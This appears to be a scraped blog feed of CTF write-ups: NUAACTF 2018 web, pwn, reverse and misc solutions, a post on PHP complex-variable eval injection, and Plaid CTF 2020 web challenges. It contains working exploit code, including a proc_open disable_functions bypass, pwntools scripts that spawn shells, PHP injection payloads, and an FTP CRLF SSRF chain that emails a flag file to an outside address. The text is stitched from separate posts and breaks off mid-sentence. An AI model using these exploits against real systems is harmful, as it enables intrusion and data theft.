\"png\") &amp;&amp; ($filetype==\"image/png\")){ if(move_uploaded_file($tmpname,$target_path)) { //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false){ $msg = \"该文件不是png格式的图片！\"; }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".png\"; $newimagepath = $UPLOAD_ADDR.$newfilename; imagepng($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload = true; } } else { $msg = \"上传失败！\"; } }else if(($fileext == \"gif\") &amp;&amp; ($filetype==\"image/gif\")){ if(move_uploaded_file($tmpname,$target_path)) { //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false){ $msg = \"该文件不是gif格式的图片！\"; }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".gif\"; $newimagepath = $UPLOAD_ADDR.$newfilename; imagegif($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload = true; } } else { $msg = \"上传失败！\"; } }else{ $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\"; }}?&gt;&lt;div id=\"upload_panel\"&gt; &lt;ol&gt; &lt;li&gt; &lt;h3&gt;说明&lt;/h3&gt; &lt;p&gt;给自己留的图片上传区&lt;/p&gt; &lt;/li&gt; &lt;li&gt; &lt;h3&gt;上传区&lt;/h3&gt; &lt;form enctype=\"multipart/form-data\" method=\"post\"&gt; &lt;p&gt;请选择要上传的图片：&lt;p&gt; &lt;input class=\"input_file\" type=\"file\" name=\"upload_file\"/&gt; &lt;input class=\"button\" type=\"submit\" name=\"submit\" value=\"上传\"/&gt; &lt;/form&gt; &lt;div id=\"msg\"&gt; &lt;?php if($msg != null){ echo \"提示：\".$msg; } ?&gt; &lt;/div&gt; &lt;div id=\"img\"&gt; &lt;?php if($is_upload){ $img_path = $addr .'/'.$img_path; echo '&lt;img src=\"'.$img_path.'\" width=\"250px\" /&gt;'; } ?&gt; &lt;/div&gt; &lt;/li&gt; &lt;?php if($_GET['action'] == \"show_code\"){ include 'show_code.php'; } ?&gt; &lt;/ol&gt;&lt;/div&gt; 看源码可以发现图片上传后经过了二次渲染，但是我们可以发现先执行了move_uploaded_file，所以文件是上传成功了的，结合文件包含漏洞 getshell ，但是我们可以看到 info.php 里面的信息 12disable_functionspassthru,exec,system,chroot,chgrp,chown,shell_exec,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru 发现大部分的执行函数都被disable了，但是我们还可以用proc_open，也可以参考 无需sendmail：巧用LD_PRELOAD突破disable_functions 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?php$command=\"id\\npwd\\n\";$descriptorspec = array(true0 =&gt; array('pipe', 'r'),true1 =&gt; array('pipe', 'w'),true2 =&gt; array('pipe', 'w')); $resource = proc_open($command, $descriptorspec, $pipes, null, $_ENV);if (is_resource($resource)){truefwrite($pipes[0], \"pwd\\n\");true$stdin = $pipes[0];true$stdout = $pipes[1];true$stderr = $pipes[2]; truewhile (! feof($stdout))true{truetrue$retval .= fgets($stdout,1024);true} truewhile (! feof($stderr))true{truetrue$error .= fgets($stderr);true}truefwrite($pipes[0], \"pwd\\n\");true$stdout = $pipes[1];true$stderr = $pipes[2]; truewhile (! feof($stdout))true{truetrue$retval .= fgets($stdout,1024);true} truewhile (! feof($stderr))true{truetrue$error .= fgets($stderr);true} truefclose($stdin);truefclose($stdout);truefclose($stderr); true$exit_code = proc_close($resource);}if (! empty($error))truethrow new Exception($error);elsetrueecho $retval; ?&gt; 然后我们在首页得到那个 img 路径，利用文件包含，可以发现成功执行命令。 接下来简化一下操作，我就直接把那些 php disable 去掉。然后我们发现有个文件 传 ew + busybox，拿use auxiliary/scanner/portscan/tcp，得到 172.20.0.3 这个 ip 上有端口开着 挂好 ew 之后，我们尝试用 smbclient 来连接内网的 samba 服务（这里第二天来弄了，之前又起了一个 container ，所以 ip 变成了 172.21.0.3 这里列一下 smbclient 常用的命令 12345678910111213141516171819202122231.列出某个IP地址所提供的共享文件夹 smbclient -L //198.168.0.1/ -U username%password2.像FTP客户端一样使用smbclient smbclient //192.168.0.1/tmp -U username%password执行smbclient命令成功后，进入smbclient环境，出现提示符： smb:/&gt; 这时输入？会看到支持的命令这里有许多命令和ftp命令相似，如cd 、lcd、get、megt、put、mput等。通过这些命令，我们可以访问远程主机的共享资源。 3,直接一次性使用smbclient命令 smbclient -c \"ls\" //192.168.0.1/tmp -U username%password和 smbclient //192.168.0.1/tmp -U username%passwordsmb:/&gt;ls 功能一样的 例，创建一个共享文件夹 smbclient -c \"mkdir share1\" //192.168.0.1/tmp -U username%password 如果用户共享//192.168.0.1/tmp的方式是只读的，会提示 NT_STATUS_ACCESS_DENIED making remote directory /share1 4，除了使用smbclient，还可以通过mount和smbcount挂载远程共享文件夹 挂载 mount -t cifs -o username=administrator,password=123456 //192.168.0.1/tmp /mnt/tmp 取消挂载 umount /mnt/tmp 若出现了下图的错误，则需要加上-m SMB2 可以看到挂载了一个 www 目录，接着进入交互模式 得到第一部分的 flag 然后发现在 172.21.0.4 上开放着 8080 端口 挂代理请求 172.21.0.4:8080 发现是 Apache Tomcat/7.0.79 访问 manager 尝试了弱密码无果，尝试 CVE-2017-12615 直接上 msf 成功拿到两段 flag Pwnoverflow简单栈溢出，用了随机数模拟了canary，本地生成随机数即可。 exp: 1234567891011121314151617181920#/usr/bin/env pythonfrom pwn import *from ctypes import *libc = cdll.LoadLibrary(\"libc.so.6\")p = process('./overflow')ret = 0x80485BDt = libc.time(0)libc.srand(t)random = libc.rand()p.recvline()payload = 'a'*0x20 + p32(random) + 'a'*0xc + p32(ret)#gdb.attach(p)p.sendline(payload)print p.recvline() kvm简单的kvm，只需要在vm里面执行端口写操作即可。 exp: 12345678910111213141516171819202122232425#/usr/bin/env pythonfrom pwn import *p = process('./kvm')p.recvuntil(\"execute: \\n\")code = asm(''' movabs rax, 0x67616c66 push 4 pop rcx mov edx, 0x100 OUT: out dx, al shr rax, 8 loop OUT ''', arch = 'amd64')p.sendline(code)p.recvuntil(\"execute again: \\n\")#gdb.attach(p)p.sendline(asm(shellcraft.amd64.linux.sh(), arch = 'amd64'))p.interactive() password_checkersnprintf 误用， 它返回的是格式化解析后形成的字符串的长度（及期望写入目标缓冲区的长度），而不是实际写入 目标缓冲区的内存长度。 123456int off = snprintf(buf, 0x100, \"name:%s&amp;\", input);...................................................... ...........................// off 可能会比较大，出现越界写off = snprintf(buf + off, 0x100 - off, \"pwd:%s\", input); 所以利用 snprintf 让 off 移动到返回地址的位置， 然后写返回地址为 getshell 函数的地址。 具体看 exp 和源码 exp: 1234567891011121314151617181920212223242526272829#!/usr/bin/python# -*- coding: UTF-8 -*-from pwn import *context.terminal = ['tmux', 'splitw', '-h']context.log_level = \"debug\"binary_path = \"../dist/pwn\"# p = process(binary_path)p = remote(\"172.17.0.2\", 20000)p.recvuntil(\"welcome.....\")# 计算出需要输入的字符串长度，让 off + buf 能够写到返回地址# 还要去掉 pwd: 这 4 个 字节payload = \"a\" * (0x10c+4-4-2-4)p.send(payload)# gdb.attach(p,\"\"\"# bp 0x0804873B# c# \"\"\")# pause()payload = p32(0x08048674)p.sendline(payload)p.interactive() type_confusion类型混淆，可以先释放一个 c1类的 obj, 然后分配一个 c2 类的 obj, 然后利用 see c1 obj 的功能调用虚函数，会调用 c2 的虚函数，c2 的相应虚函数的作用就是 system(“sh) 1234int c2::dump(){ system(\"sh\");} exp: 123456789101112131415161718192021222324252627#!/usr/bin/python# -*- coding: UTF-8 -*-from pwn import *context.terminal = ['tmux', 'splitw', '-h']context.log_level = \"debug\"binary_path = \"../dist/pwn\"# p = process(binary_path)p = remote(\"172.17.0.2\", 20000)p.recvuntil(\"Your choice: \")p.sendline(\"2\")p.recvuntil(\"Index: \")p.sendline(\"0\")p.recvuntil(\"Your choice: \")p.sendline(\"100\")p.recvuntil(\"Your choice: \")p.sendline(\"1\")p.recvuntil(\"Index: \")p.sendline(\"0\")p.interactive() 具体看 exp 和源码 Revstupid_contract_challenge[rev]简单solidity逆向，源码如下 12345678910111213141516pragma solidity ^0.4.25;contract stupidChallenge{ bytes32 seed = 0xaaa0adabb79fb8b9bca5a8938fa3a2b8415250476c705b525f5f565d5456124e; function generateFlag() public returns(bytes){ bytes memory finalFlag = new bytes(seed.length); uint i; for(i = 0;i&lt;seed.length/2;i++) { finalFlag[i]=seed[i]^0xcc; } for(;i&lt;seed.length;i++) { finalFlag[i]=seed[i]^0x33; } return finalFlag; }} 直接把字节码扔 https://ethervm.io/decompile 即可 variant_of_cat智能合约，整数下溢先调用fightAsuriMonster使得攻击力下溢，再次调用fightBoss即可 STG TouHou是一个彻头彻尾的车万游戏呢。 正常通关通关游戏，会把flag打印在屏幕上 逆向分析这个题目会告知大家这个程序叫做四圣龙神录，其实是可以从github上找到源码的。Rev的题目拿到了源码，那基本上就做出来了。当然源代码肯定没有flag相关的逻辑，可以结合源代码对程序进行审计。首先逆向日常搜索flag字符串，会发现如下的函数: 12345678910void sub_4308D0(){ int v0; // eax if ( dword_D0CA74 == 1 ) { v0 = sub_40E039(255, 255, 255); sub_40D837(0, 40, v0, \"Flag:%s\", (unsigned int)&amp;byte_D0CA78); }} 这个Flag很显然是刻意打印的，那么追踪一下这个byte_D0CA78 1234567891011121314151617181920signed int __cdecl sub_430730(char a1){ signed int result; // eax char v2; // STD7_1 signed int i; // [esp+E8h] [ebp-8h] signed int j; // [esp+E8h] [ebp-8h] for ( i = 0; i &lt; 54; ++i ) byte_AEE308[i] -= a1; for ( j = 0; ; j += 2 ) { result = j; if ( j &gt;= 54 ) break; v2 = 16 * trans2num(byte_AEE308[j]); byte_D0CA78[j / 2] = trans2num(byte_AEE309[j]) + v2; } dword_D0CA74 = 1; return result;} 会找到这个函数，可以看到这里又存储了一个全局变量。这里的运算相当于是将一个数字分成了高4bit和低4bit然后进行合并处理，那么我们继续回溯，检查这个byte_AEE308的来历，会找到另一段的程序逻辑: 1234567891011121314signed int __cdecl sub_430850(char a1){ signed int result; // eax signed int i; // [esp+DCh] [ebp-8h] for ( i = 0; ; ++i ) { result = i; if ( i &gt;= 54 ) break; byte_AEE308[i] ^= a1; } return result;} 跟踪调用关系，会发现这两个函数是由同一个函数调用的: 12345678910signed int __cdecl sub_430960(int a1, char a2){ signed int result; // eax if ( a1 == 1 ) return sub_405696(a2); if ( a1 == 2 ) result = sub_402A09(a2); return result;} 跟踪到外面，可以看到这样的逻辑 123456result = dword_D0C03C++ + 1; if ( dword_D0C03C == 1 ) return sub_40A907(dword_D0C03C, 255); if ( dword_D0C03C == 2 ) result = sub_40A907(dword_D0C03C, 19); return result; 结合东方（游戏逻辑！）一般来说都是先1后2，所以是先调用前面那个逻辑后调用后面的逻辑。于是根据调用顺序，我们能够写出解密脚本: 1234567891011121314151617181920import codecsenc = [182,135,181,183,182,187,182,187,182,185,181,184,182,182,181,138,183,181,182,183,185,187,182,185,185,188,182,136,185,185,183,134,185,186,183,134,184,181,185,185,182,135,183,185,185,188,184,138,185,184,182,134,181,136 ]def dec_one(enc, num): for i in range(len(enc)): enc[i] ^= numdef dec_two(enc, num): for i in range(len(enc)): enc[i] -= num tmp = 0 ans = ''.join(chr(c) for c in enc) print(codecs.decode(ans,'hex'))if __name__ == '__main__': dec_one(enc, 255) dec_two(enc, 19) # nuaactf{We1c0m3_2_G3nS0K4o} Middle题目来源：因为难度定位是中等所以叫这个 初步准备对于想要做这个题目的人来说，想必也是有了一定的基础。比如说首先要认得这个程序是一个ELF文件是Linux下的可执行文件之类的。（其实我第一次做的时候就不会认这个，滑稽）那么逆向首先无非准备几个工具 静态工具：IDA 动态分析工具：gdb 环境：Ubuntu 首先运行程序，发现程序两个行为： 输入nuaactf{.+}格式的字符串 如果输入完成，会让我们做一个C语言的题目 而且在运行的时候会发现，程序会在5秒之内结束。整个题目第一眼逻辑就有了 静态辅助掏出静态分析工具，前面一大段其实是字符串在计算对齐的内容，不是特别重要。整体分析就会发现其实是一个给字符串置0的操作。之后的第一个函数sub_80485E4();在打印欢迎内容，之后会遇到函数: 123456if ( ptrace(0, 0, 1, 0) &lt; 0 ){ puts(\"Hey guys, what are you doing?!not cheat me~\"); ++dword_804A0D8; exit(-1);} 这个ptrace上网查就会发现，这个函数会阻止动态调试，这里可以选择将这个内容patch掉，将二进制内容改成90（nop），跳过这个内容。或者gdb调试直接跳过这个内容也可以，反正有办法都行。 之后来到这个地方的逻辑: 123456789101112puts(\"Hey you, what's your password?\");puts(\"format:nuaactf{}, length:24\");for ( i = 0; i &lt; 24; ++i ) __isoc99_scanf(\"%c\", i + a1);puts(\"em?ok, you can get in...\");for ( j = 0; ; ++j ){ result = j; if ( j &gt;= 24 ) break; *(_BYTE *)(j + a1) = ((int (__cdecl *)(_DWORD))loc_8048628)(*(unsigned __int8 *)(j + a1));} 可以看到这里的内容就是让我们输入一段类似flag的内容，不过注意到，最后会对数组a1的每一个元素进行更新，但是似乎是一个没有被识别成函数的内容，跟进去查看，发现一些奇怪的指令阻止了程序的正常解析，不过仔细观察，似乎这个跳转根本就不会调用到这些神奇的指令，利用前面教过的patch方法，就能够修改掉程序内容，看到正确的程序内容: 1234v2 = 0;for ( i = 0; i &lt;= 7; ++i ) v2 |= (((signed int)a1 &gt;&gt; i) &amp; 1) &lt;&lt; *(_BYTE *)(i + 0x804A0C2);return v2 这个巨大的数字其实是一个地址，里面内容为 12345678.data:0804A0C2 db 3.data:0804A0C3 db 7.data:0804A0C4 db 2.data:0804A0C5 db 1.data:0804A0C6 db 6.data:0804A0C7 db 4.data:0804A0C8 db 5.data:0804A0C9 db 0 理解一下，就相当于是一个数组的下标i在遍历。总的分析这个算法，其实就是将一个字节的每一bit的顺序重新映射到一个新的位置上具体对应关系为: 120 1 2 3 4 5 6 73 7 2 1 6 4 5 0 C语言课程然后有一个让大家轻松一下的环节，让大家输入一个程序的运行结果。这个一看就是宏定义的错误实例，即会产生一个非预期的答案 11+3*1+4 = 8 不过其实整个考出来跑也是可以的~ 最后的答案最后一段逻辑如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344v3 = -66;v4 = 116;v5 = 48;v6 = 48;v7 = -80;v8 = 124;v9 = -68;v10 = -14;v11 = 42;v12 = 48;v13 = 48;v14 = 16;v15 = 98;v16 = -74;v17 = 116;v18 = -26;v19 = -92;v20 = 88;v21 = 124;v22 = -26;v23 = 80;v24 = 124;v25 = 16;v26 = 118;puts(\"Well,Well,You get here right?\");if ( !dword_804A0D8 || dword_804A0D0 ){ puts(\"En?No No No you are not clever~\");}else{ puts(\"!!! Hey !!!\"); puts(\"Do you remember your password?\"); for ( i = 0; i &lt;= 23; ++i ) { *(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) ^ dword_804A0D4; if ( *(&amp;v3 + i) != *(_BYTE *)(i + a1) ) break; } if ( i == 24 ) puts(\"YOU ARE RIGHT!THE KEY IS FLAG!\"); else puts(\"O?Nearly\");} 可以看到离正确答案很近了~不过会发现，不是那么容易能够进入这个匹配逻辑。仔细观察会发现，变量dword_804A0D8在一开始的ptrace处出现过，而dword_804A0D0则是会在一个handler里面出现，这个handler其实是注册的一个信号事件，5秒后自动跳转为1（这个地方其实是坑调试器用的，因为调试器可以选择忽略alarm但是此时变量依然会被置为1）不过一样可以用强硬的手段跳过这段逻辑。之后发现是一段关键逻辑比较 123*(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) ^ dword_804A0D4;if ( *(&amp;v3 + i) != *(_BYTE *)(i + a1) ) break; 其中dword_804A0D4存放了C语言那段中，我们输入的正确答案。如果输入正确答案，则会通过与上面出现那一大段数字（其实是一个数组）进行异或，得到答案。于是总结下来，我们可以得到整体逻辑: 首先对输入进行bit变化 与C语言输入的正确答案进行异或 与程序内部的数据比较 因此可以写出解密逻辑: 123456789101112131415161718# -*- coding:utf-8 -*-bit_map = [7, 3, 2, 0, 5, 6, 4, 1]check = [190, 116, 48, 48, 176, 124, 188, 242, 42, 48, 48, 16, 98, 182, 116, 230, 164, 88, 124, 230, 80, 124, 16, 118]right_answer = 8def bit_detrans(num): tmp_u = 0 for i in range(8): tmp = (num &gt;&gt; i) &amp; 0x1 tmp_u |= (tmp &lt;&lt; bit_map[i]) return tmp_utmp = [each ^ right_answer for each in check]ans = [chr(bit_detrans(each)) for each in tmp]print(''.join(ans)) # nuaactf{Haa!You_G0t_1t!} Misc签到题打开即送flag fsapfs dmg末尾给了12位的密码Xmas3?theme3 直接打开dmg得到flag.txt revpyc 123with open('rev', 'rb') as f1: with open('genflag', 'wb') as f2: f2.write(f1.read()[::-1]) 得到genflag后，modu1e需要改为module 用uncompyle6 1uncompyle6 -o . genflag 参考enc写dec 123456789101112def enc(): flag = r'To make it more difficult to calculate the flag by hand, nuaactf{py_uncompyle}, flag is for scripts' [print('{:x}'.format(ord(each)+0x32), end='l') for each in flag] print()def dec(): enc_flag = '86la1l52l9fl93l9dl97l52l9bla6l52l9fla1la4l97l52l96l9bl98l98l9bl95la7l9ela6l52la6la1l52l95l93l9el95la7l9el93la6l97l52la6l9al97l52l98l9el93l99l52l94labl52l9al93la0l96l5el52la0la7l93l93l95la6l98ladla2labl91la7la0l95la1l9fla2labl9el97lafl5el52l98l9el93l99l52l9bla5l52l98la1la4l52la5l95la4l9bla2la6la5l' enc_flag = enc_flag[:-1].split('l') for each in enc_flag: print(chr(int(each, 16)-0x32), end='') print()enc()dec() 得到flag plotg-code plot https://ncviewer.com/","link":"/2018/12/25/NUAACTF-2018-%E5%AE%98%E6%96%B9wp/"},{"title":"从一道题讲PHP复杂变量","text":"近期有小伙伴问了我一道题，然后自己发掘到了一些关于 PHP 复杂变量不太被关注的问题。 文章首发于先知社区：https://xz.aliyun.com/t/4785 [TOC] 起因起因是因为一个小伙伴问了我一道题 123456789&lt;?phphighlight_file(__FILE__);$str = $_GET['str'];$str = addslashes($str);if(preg_match('/[A-Za-z0-9]+\\(/i',$str) == 1){ die('hack');}eval('$a=\"' . $str . '\";');?&gt; 自己想了好一会好像并没有能用自己当时的现有知识去解决这个问题，于是我去搜集了一些资料学到了一些新的知识。感兴趣的小伙伴可以先自己做一下哈～ 题目解释整个代码逻辑非常简单，接受一个$_GET['str']的传参，在经过addslashes()函数转义特殊符号与正则表达式检验之后，传入eval()当中拼接到$a=\"\";变量当中。 既然有eval()，那是不是可以执行命令呢？答案是当然可以的。 首先我们来看正则表达式的效果如下图所示 如果小括号前有数字或者字母的话就会die()掉整个程序，大概意思就是防止直接使用函数，例如不能直接使用system('ls')这样子。 PHP 复杂变量Introduction下面我们简单介绍一个关注度比较少的一个 php 知识——PHP 复杂变量。按照 php 官方文档对复杂变量的介绍 复杂语法不是因为其语法复杂而得名，而是因为它可以使用复杂的表达式。 任何具有 string 表达的标量变量，数组单元或对象属性都可使用此语法。只需简单地像在 string 以外的地方那样写出表达式，然后用花括号 { 和 } 把它括起来即可。由于 { 无法被转义，只有 $ 紧挨着 { 时才会被识别。可以用 {$ 来表达 {$。 我们介绍一个简单的例子： 123456789&lt;?php$great = 'fantastic';// 无效，输出: This is { fantastic}echo \"This is { $great}\";// 有效，输出： This is fantasticecho \"This is {$great}\";echo \"This is ${great}\"; 也就是说在 php 中，我们还可以利用${xxx}的形式来表达一个变量。 Usage官方文档还给出了一个非常有意思的 Note: Note: 函数、方法、静态类变量和类常量只有在 PHP 5 以后才可在 {$} 中使用。然而，只有在该字符串被定义的命名空间中才可以将其值作为变量名来访问。只单一使用花括号 ({}) 无法处理从函数或方法的返回值或者类常量以及类静态变量的值。 函数、方法！所以我们根据文档可以怎么利用呢？ 1234&lt;?phphighlight_file(__FILE__);$a = \"${phpinfo()}\";?&gt; Thinking然而为什么可以这么做呢？虽然官方文档很明确的指出了，但是是不是还是有一点费解的感觉？ 其实在 php 中，我们可以查阅 php 文档知道有 PHP 中的变量用一个美元符号后面跟变量名来表示。变量名是区分大小写的。 变量名与 PHP 中其它的标签一样遵循相同的规则。一个有效的变量名由字母或者下划线开头，后面跟上任意数量的字母，数字，或者下划线。按照正常的正则表达式，它将被表述为：[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*'。 我们可以看到${phpinfo()}里面在严格意义上来说并不是一个变量，那为什么可以执行呢？ 让我们来看一个例子 在 php 中，可以接受函数的返回值作为变量名，而phpinfo()的返回值为TRUE，所以先将phpinfo()执行了，将返回值返回作为了变量名。 我们可以再来看一个例子。 这里就更清楚的说明了执行了system('whomai')并把其返回值zedd作为了变量，最后$zedd才被修改了。 这里也与php变量解析的复杂语法作者 @s1ye 师傅交流了一下，也跟他讨论了他文章中有几个地方存在的疏忽之处，${phpinfo()}得到的并非是$TRUE，具体可以使用上述方法看看。 ChallangesEasy我们不妨先把问题简化，如果没有任何防护，我们可以怎么做呢？ 123456&lt;?phperror_reporting(0);highlight_file(__FILE__);$str = $_GET['str'];eval('$a=\"' . $str . '\";');?&gt; 直接传入拼接自然我们肯定有双引号闭合进而执行命令。 Medium1234567&lt;?phperror_reporting(0);highlight_file(__FILE__);$str = $_GET['str'];$str = addslashes($str);eval('$a=\"' . $str . '\";');?&gt; 那加上addslashes()方法呢？既然不能逃逸双引号，我们就可以利用 php 复杂变量来处理。 Difficult123456789&lt;?phphighlight_file(__FILE__);$str = $_GET['str'];$str = addslashes($str);if(preg_match('/[A-Za-z0-9]+\\(/i',$str) == 1){ die('hack');}eval('$a=\"' . $str . '\";');?&gt; 好的，终于回到了我们题目，这样的话就不能单纯地使用函数方法了。那我们可以怎么做呢？ 如果开启了Notice回显的话，我们可以利用反引号就可以简单实现命令执行了 那要是没开启呢？自然不可行了。 接下来就可以利用可变函数的与字符串拼接的特性了，简单来说就用下图的技巧，详细的可以移步个人博客查看Some Tricks of Bypass php waf 所以我们可以这里玩法就很多样了 关于 php 复杂变量的玩法还有很多，这里就大概说到这里吧，文中有不对之处还望师傅们斧正。 Referencephp 文档-String 字符串 php 文档-复杂(花括号)语法 php变量解析的复杂语法","link":"/2019/04/11/PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F/"},{"title":"Plaid CTF 2020 Contrived Web Problem Write Up","text":"Here is my write up of Contrived Web Problem in Plaid CTF 2020. [TOC] TL;DRYou can get the attachment of the chall in this repo. You can find CRLF in ftp then use CRLF to inject ftp command. You can use PORT command to build a TCP connection with rabbitmq server. Make a HTTP message which can let the nodemailer send a email containing the flag as a attachment to your email through rabbitmq web api. Hide this HTTP message in a PNG. Upload the picture as your profile. Use the REST command to cut the PNG and let PETR command return the HTTP message which is in the PNG to rabbitmq server. Check FLAG in your email. CRLF in FTPWe guess there should be a CRLF in FTP at first. And use %250d%250a to test it because it use the following code. 123456789101112if (parsed.protocol === \"ftp:\") { let username = decodeURIComponent(parsed.username); let password = decodeURIComponent(parsed.password); let filename = decodeURIComponent(parsed.pathname); let ftpClient = await connectFtp({ host: parsed.hostname, port: parsed.port !== \"\" ? parseInt(parsed.port) : undefined, user: username !== \"\" ? username : undefined, password: password !== \"\" ? password : undefined, }); image = await ftpClient.get(filename);} Send this url through api/image. 1GET /api/image?url=ftp://2:2%250d%250aPORT%20172,32,56,72,61,56%250d%250aREST%206%250d%250aRETR%20%252fuser%252fb21791e2-6016-4c36-8f9a-6054750d2b5a%252fprofile%252epng@ftp:21/user/b21791e2-6016-4c36-8f9a-6054750d2b5a/profile.png This url will make a request like this. So we get a CRLF now. Or you can audit the code of ftp https://github.com/mscdex/node-ftp then you can find it do nothing with CRLF. The active mode of FTPFTP have two modes, one is active and the other is passive. In active mode, the client establishes the command channel but the server is responsible for establishing the data channel. This can actually be a problem if, for example, the client machine is protected by firewalls and will not allow unauthorised session requests from external parties. In passive mode, the client establishes both channels. We already know it establishes the command channel in active mode and it does the same here. If we don’t inject code through CRLF, we can get the FTP traffic like this: So it will use PASV command to open passive mode and build a connection with client. Why not inject PORT commant through CRLF to let ftp-srv open active mode and let ftp-srv connect with my server? Yeah. Just like this. I use PORT command to let ftp-srv connect with my server. But if you try with LIST or something else following by PORT command, you can’t get the response on your server. It’s a bit strange that I still confused about it. If you know something about this, welcome to discuss. The mail serverAnd how can we get flag? Use FTP? But the flag.txt is not on the ftp server. So we should think about how to get flag. I notice there is a function that use to reset user’s password. services/api/index.ts 123456789101112131415161718192021222324app.post(\"/password-reset\", async (req, res) =&gt; { let { email } = req.body; if (typeof email !== \"string\") { res.status(500).send(\"Bad body\"); } let newPassword = Array.from(new Array(16), () =&gt; \"abcdefghijklmnopqrstuvwxyz0123456789\"[Math.floor(Math.random() * 36)]).join(\"\"); let hashedPassword = await bcrypt.hash(newPassword, 14); await withClient((client) =&gt; client.query(`UPDATE user_authSET password = $2WHERE email = $1`, [email, hashedPassword])); let channel = await rabbit.createChannel(); channel.sendToQueue(\"email\", Buffer.from(JSON.stringify({ to: email, subject: \"Password Reset\", text: `Hello there, your new password is ${newPassword}`, }))); res.status(200).send(\"Password reset\");}); It seems we can’t control the ${newPassword}. But I find a way to get flag through reading nodemailer’s documentation. https://nodemailer.com/message/attachments/ We can send an email containing the flag as attachment! We can make a json like this: 1{\"to\":\"your@gmail.com\",\"subject\":\"Password Reset\",\"text\":\"Hello there, your new password is newpass\",\"attachments\":[{\"filename\":\"flag.txt\",\"path\":\"/flag.txt\"}]} So what we need to do is to control nodemailer to send our message. rabbitmqservices/email/index.ts 123456789101112131415161718let channel = await rabbit.createChannel();channel.consume(\"email\", async (msg) =&gt; { if (msg === null) { return; } channel.ack(msg); try { let data = JSON.parse(msg.content.toString()); await transport.sendMail({ from: \"plaid2020problem@gmail.com\", subject: \"Your Account\", ...data, }); } catch (e) { console.error(e); }}) And we can find how server sendemail here. It uses rabbitmq. And rabbitmq has got web api. So it seems we can control what nodemailer send through rabbitmq’s web api. But how can we send http request to rabbitmq? It seems we have got the method how to get flag and the method let ftp server build TCP connection with arbitrary server. It seems we need a connection with them! SSRF!The last key to solve this problem is let the ftp server send a http request to rabbitmq server. But how? We notice that we can hide a http message in the profile png and use RRETR to let the ftp server return the message of png. And use REST 6 to cut the message, make the response like a http message. This is similar with http response splitting. So when ftp server return the data of profile picture, it will return data like this: 1234567POST /api/exchanges/%2f/amq%2edefault/publish HTTP/1.1Host: 172.32.56.72:15672Content-Type: application/jsonauthorization: Basic dGVzdDp0ZXN0Content-Length: 300{\"properties\":{},\"routing_key\":\"email\",\"payload\":\"your_payload\",\"payload_encoding\":\"base64\"} But the TCP connection is not persisted, we can’t get the response of rabbitmq server and most importantly we can’t add a new message in rabbitmq queue. During the competition, we have to frequently send lots of requests to api server. Hope some requests can exploit successfully. At last we made it once. After ctf ends, @zwad3, the author of this chall, replied to me. He mentioned we should send the real request followed by 50,000 dumb requests (in one file). I tried this method today and this really gave 100% success rate. Just like this, I put 1000 http get requests in one file and every time can get flag. Interesting challange! Hope u enjoy!","link":"/2020/04/20/Plaid-CTF-2020-Web-1/"},{"title":"Plaid CTF 2020 Catalog","text":"本文是关于 Plaid CTF 2020 Catalog 题目的一些复盘与探究。 这道题是本次 PlaidCTF 全场唯一一道0解的题目，可以说是有一定的难度的，也比较有意思。这里非常感谢 @wupco @rebirthwyw @bks25wzsx（众所周知，@zsx 又名 @bks25wzsx）师傅们的指点，复盘的时候比较艰难，整个流程我会尽量用自己还算比较清晰的逻辑讲一下本道题，如果哪里有出错的还请师傅们多多包涵。 由于这个题是复盘题，所以做题思路可能会少一些，更多的是对于出题点以及exp一些分析什么的。 5月6日更新：作者已经放出了他的 Write Up——PlaidCTF 2020: Catalog Writeup ，题目仓库—— catalog ，文中内容可能与作者 Write Up 有些许出入，请以作者的 Write Up 为准！本文暂未更新！ Information Here’s the site. The flag is on this page. Browser: Chromium with uBlock Origin 1.26.0 installed and in its default configuration Flag format: /^PCTF\\{[A-Z0-9_]+\\}$/ Hints: To view your post, the admin will click on a link on the admin page. You might want to read up on User Activation. The intended solution does not require you to submit hundreds of captchas. Hint: Admin Bot Timeout The admin bot will always disconnect after about 30 seconds. 给没有看题的小伙伴简略地概括一下题目，题目是个黑盒，有登录注册、发表 issue 、提交 issue 给 admin 看，主要是这些功能，很明显题目需要我们进行 XSS 其中有几个细节漏洞： 登录失败的时候会直接无过滤地回显用户名，这里有一处 HTML 注入 在提交 issue 处，有一项需要提交 image URL 的地方也存在着 HTML 注入 题目设置还会利用 session 来存储一些 HTML 元素，例如我们在同一个 session 先登录，再用这个 session 发送一个登录失败的请求，刷新我们已登录的页面我们就可以看到： CSP1Content-Security-Policy: default-src 'nonce-xhncdWd319Yj3acHJbKoEWmK8stBxy88'; img-src *; font-src 'self' fonts.gstatic.com; frame-src https://www.google.com/recaptcha/ 题目给的 CSP 是这些，这些 CSP 限制了我们插入的代码执行，但是也很明显，这里并没有设置 base-uri ，所以我们可以试图利用 HTML 注入点，利用&lt;base&gt;来进行 XSS ，但是并不像 RCTF 2018 rblog 那道题，这道题的插入点在比较靠后的地方，没有办法控制之前引入文件的 url ，所以没有办法利用 base uri 的思路来进行 XSS Exp Catalog has two injections: the image tag on the issue page and the username when you fail to login. Use the image tag one with a meta redirect to get offsite. Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation. Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again. Now make a no-cors POST to use the failed login injection, then send them to issue.php?id=3. So now we have arbitrary content with a user activation on the correct page, but still no code exec. (…the rest of the exploit to come in a moment…) (…continuation of previous post…) Ok, but what can we do? A recent addition to Chromium was scroll-to-text-fragment, which lets you search the page for text (in entire words only) and 